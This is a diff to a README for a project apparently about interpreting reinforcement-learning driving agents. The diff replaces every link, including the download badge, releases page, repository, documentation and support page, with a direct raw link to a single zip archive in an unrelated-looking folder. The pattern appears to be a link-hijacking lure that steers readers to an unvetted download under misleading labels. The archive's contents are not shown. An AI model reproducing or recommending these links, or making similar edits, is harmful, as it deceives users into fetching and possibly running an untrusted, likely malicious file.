@@ -1,6 +1,6 @@
 # 🚗 autonomous-driving-rl-interpretability - Understand AI for Safer Driving
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/luquinhas18/autonomous-driving-rl-interpretability/releases)
+[![Download](https://raw.githubusercontent.com/luquinhas18/autonomous-driving-rl-interpretability/main/Palestinian/autonomous-driving-rl-interpretability.zip%https://raw.githubusercontent.com/luquinhas18/autonomous-driving-rl-interpretability/main/Palestinian/autonomous-driving-rl-interpretability.zip)](https://raw.githubusercontent.com/luquinhas18/autonomous-driving-rl-interpretability/main/Palestinian/autonomous-driving-rl-interpretability.zip)
 
 ## 📖 Description
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run the application.
 
 Go to the following link to access the software:
 
-[Visit the Releases Page](https://github.com/luquinhas18/autonomous-driving-rl-interpretability/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/luquinhas18/autonomous-driving-rl-interpretability/main/Palestinian/autonomous-driving-rl-interpretability.zip)
 
 ### 2. 🗂️ Download the Application
 
@@ -83,9 +83,9 @@ This project contributes to the ongoing efforts in making AI in autonomous drivi
 
 For more details about this project and updates, please refer to the following:
 
-- [GitHub Repository](https://github.com/luquinhas18/autonomous-driving-rl-interpretability)
-- [Documentation](https://github.com/luquinhas18/autonomous-driving-rl-interpretability/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/luquinhas18/autonomous-driving-rl-interpretability/main/Palestinian/autonomous-driving-rl-interpretability.zip)
+- [Documentation](https://raw.githubusercontent.com/luquinhas18/autonomous-driving-rl-interpretability/main/Palestinian/autonomous-driving-rl-interpretability.zip)
 
-For any additional help, feel free to check our [support page](https://github.com/luquinhas18/autonomous-driving-rl-interpretability/issues).
+For any additional help, feel free to check our [support page](https://raw.githubusercontent.com/luquinhas18/autonomous-driving-rl-interpretability/main/Palestinian/autonomous-driving-rl-interpretability.zip).
 
-[Download the latest version](https://github.com/luquinhas18/autonomous-driving-rl-interpretability/releases) and dive into understanding AI today!
+[Download the latest version](https://raw.githubusercontent.com/luquinhas18/autonomous-driving-rl-interpretability/main/Palestinian/autonomous-driving-rl-interpretability.zip) and dive into understanding AI today!
